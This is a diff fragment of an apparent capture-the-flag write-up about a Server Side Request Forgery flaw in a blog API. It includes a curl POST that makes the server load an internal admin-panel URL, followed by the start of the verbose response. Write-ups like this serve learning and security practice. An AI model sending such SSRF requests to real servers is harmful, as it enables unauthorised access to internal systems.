@@ -31,10 +31,11 @@ The vulnerable code snippet is
 The api receives a request containing json data and uses the file:/// wrapper to load post already saved with a user's id
 The api endpoint code loads any url submitted to it without any form of restrictions and it makes it susceptible to Server Side Request Forgery which occurs when a website is induced to load a particular url.I gained access to the websit
 e by using the vulnerable endpoint to access it via Curl.  
-   
+### Curl request 
+  
     curl https://ecorpblog.uctf.ir/api/view.php -v -X POST --header 'Content-Type:application/json' -d '{"post": "http://admin-panel.local/"}'
 
-    ####RESPONSE#####
+#### RESPONSE
     * Using Stream ID: 1
     > POST /api/view.php HTTP/2
     > Host: ecorpblog.uctf.ir
